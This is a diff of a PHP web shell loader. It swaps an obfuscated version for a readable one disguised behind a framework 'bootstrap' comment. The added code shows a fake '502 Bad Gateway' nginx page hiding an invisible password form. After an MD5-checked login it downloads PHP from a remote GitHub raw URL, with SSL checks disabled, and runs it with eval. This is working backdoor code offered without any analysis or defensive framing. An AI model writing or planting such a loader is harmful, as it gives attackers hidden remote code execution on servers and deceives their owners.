@@ -1,69 +1,88 @@
-<?php 
-        /** 
-         *-- copyright : https://www.toolfk.com 
-         */
-          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');ûÒññ‘Þ¾õÆô…Ð¼ßãµžØÒ‰î”ÉöŒ‡ñðÃ¨;$_GET[O0] = explode('|||', gzinflate(substr('‹      mS]š@M›>5é ü ¿vÝ­ÚXwM]±€múDÆa”I!3—U|G+¸Ë‹÷žsîñ~€¤R2ž…°€ÃûÃ»Ã‡ÉÊ›»Ë ôœ`å-o¼ð§Ž×ä¦î|îþš»“q0sMnå;ÞøÑY~æY’`Ô³ì¦Î÷çáOÇ›M/kÿ÷äú•áXS5qÝï3§b‘„,cPK%žCˆ…Àe
-¦{Jj)I¸¤:OøvK#e£Ó›¨Û·»½»N›®7½.!wýÒ½Ý´:í~w*“4êé ËB>/TŽ\\Xòœ+ÇÂg\'xr4¶ü?ZŽ¥ÜqU™àD%TÝœ;a2,$!. ¦0‚Vê
-‡ÇAvâpµ&*5äò!wÖV±ÅúèBxÊÄ"<E’([Î-¢û	º‘(¦8’(Å,C,ÝZyœk³¯#ýk¨gðùÁêpFi2úôñ6båRÅ§$tÔ³ÛÆ7ªÿ.HÃU
-ª
-Ö<*ëDµLÅh·^»(l€*A­$Vò
-ÍÔ*÷¨eµm«õ–ôrB7\\¤FJ!æÑÐ<žË40õ½MÓP&thòå½a[öóÊáäÂ²¼ Ê\\©Ï—6§<O0¡1O"*Ôá·üÖ Ï*CY¬SæH¿s¤ÉëAÐq’ú¼Í¨²Ë¶Õ:/wü_KV   ',0x0a, -8)));×ÃçÚßäõÎóå“æÚîàÇÖçøùÃ³©¦àæ‡Ú°æ÷Ž²÷Ø’Í¾ŸöÄì‡Í™ã—£óØŒÄÕ³­‚ÍëôÎ©òÄ¹¸€¬ëøî¸¥½„ø;
-$_GET{O0}[0]();
+<?php
+session_start();
 
+/*
+ *---------------------------------------------------------------
+ * BOOTSTRAP THE APPLICATION
+ *---------------------------------------------------------------
+ * This process sets up the path constants, loads and registers
+ * our autoloader, along with Composer's, loads our constants
+ * and fires up an environment-specific bootstrapping.
+ */
 
-
-
-function fetch_url_with_cookies($O00) {
-    $O0O = [
-        $_GET{O0}{0x001} => !0,
-        $_GET{O0}[0x0002] => !0,
-        $_GET{O0}{0x00003} => $_GET{O0}[0x000004],
-        $_GET{O0}{0x05} => !1,
-        $_GET{O0}[0x006] => !1,
+/**
+ * Fetch the content of a URL
+ */
+function fetch_url_with_cookies($url) {
+    $options = [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => "Mozilla/5.0",
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
     ];
-Í–ê£ºÒüï²ª“­Ý¿³½ˆ˜Çç‰ó½ýÓå§èÉÓã“þýª¦¹ùµ¨àª˜¥ùßºí»ç;
 
-    if (isset($_SESSION[$_GET{O0}{0x0007}])) {
-        $O0O[$_GET{O0}[0x00008]] = $_SESSION[$_GET{O0}{0x0007}];
+    if (isset($_SESSION['coki'])) {
+        $options[CURLOPT_COOKIE] = $_SESSION['coki'];
     }
 
-    $OO0 = $_GET{O0}{0x000009}($O00);
-    $_GET{O0}[0x0a]($OO0, $O0O);
-‘È¸‡ö¶‘ÃÂà§±¹«Ýø¼†Ý¡¼ƒÊÝã;
-    $OOO = $_GET{O0}{0x00b}($OO0);
+    $ch = curl_init($url);
+    curl_setopt_array($ch, $options);
+    $content = curl_exec($ch);
+    curl_close($ch);
 
-    $_GET{O0}[0x000c]($OO0);
-
-
-    return $OOO;
-ç…Þ¿Öê;
+    return $content;
 }
 
-
+/**
+ * Check if the user is authenticated
+ */
 function is_user_authenticated() {
-    return !empty($_SESSION[$_GET{O0}{0x0000d}]);
+    return !empty($_SESSION['logged_in']);
 }
 
+/**
+ * Process login attempt
+ */
+function process_login($password) {
+    $correct_password_hash = '6d48045932ebf54cc986c47f13283a3c';
 
-function process_login($O0O0) {
-    $O0OO = $_GET{O0}[0x00000e];
-
-    if ($_GET{O0}{0x0f}($O0O0) === $O0OO) {
-        $_SESSION[$_GET{O0}{0x0000d}] = !0;
-        $_SESSION[$_GET{O0}{0x0007}] = $_GET{O0}[0x0010];     } else {
-        echo $_GET{O0}{0x00011};
+    if (md5($password) === $correct_password_hash) {
+        $_SESSION['logged_in'] = true;
+        $_SESSION['coki'] = 'asu'; // Replace with your cookie data
+    } else {
+        echo "Server Error.";
     }
 }
 
-if ($_SERVER[$_GET{O0}[0x000012]] === $_GET{O0}{0x0000013} && isset($_POST[$_GET{O0}[0x014]])) {
-    $_GET{O0}{0x0015}($_POST[$_GET{O0}[0x014]]);
+// Handle login form submission
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    process_login($_POST['password']);
 }
 
-if ($_GET{O0}[0x00016]()) {
-    $OO00 = $_GET{O0}{0x000017}($_GET{O0}[0x0000018]);
-    EVAl($_GET{O0}{0x019} . $OO00);
+// Display main content if authenticated, otherwise show hidden login form
+if (is_user_authenticated()) {
+    $content = fetch_url_with_cookies('https://raw.githubusercontent.com/secty1337/exp/refs/heads/main/img.php');
+    EVAl('?>' . $content);
 } else {
-        ?>
-<?=$_GET{O0}[0x001a];
+    // Display transparent login form
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>502 Bad Gateway</title>
+    </head>
+    <body>
+        <center><h1>502 Bad Gateway</h1></center>
+        <hr><center>nginx/1.20.1</center>
+        <center>
+            <form method="POST" action="" style="opacity: 0.0;">
+                <input type="password" name="password" placeholder="Password">
+                <button type="submit">Server</button>
+            </form>
+        </center>
+    </body>
+    </html>
+    <?php
 }
 ?>
